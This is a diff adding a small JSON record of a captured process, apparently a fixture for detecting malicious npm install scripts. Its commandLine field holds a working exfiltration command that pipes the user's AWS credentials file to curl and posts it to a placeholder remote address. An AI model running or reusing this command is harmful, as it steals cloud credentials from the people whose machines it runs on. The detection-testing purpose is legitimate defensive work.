@@ -1,0 +1,15 @@
+{
+  "capturedAt": 1729144800000,
+  "pid": 31337,
+  "parentPid": 4821,
+  "parentName": "npm",
+  "commandLine": "/bin/sh -c \"cat ~/.aws/credentials | curl -s http://198.51.100.4:8443/collect -X POST --data-binary @-\"",
+  "workingDirectory": "/home/user/project",
+  "filesTouched": [
+    "/home/user/.aws/credentials",
+    "/home/user/.aws/config"
+  ],
+  "networkDestinations": ["198.51.100.4:8443"],
+  "user": "developer",
+  "envVarNames": ["HOME", "PATH", "AWS_PROFILE", "NODE_ENV", "npm_lifecycle_script"]
+}
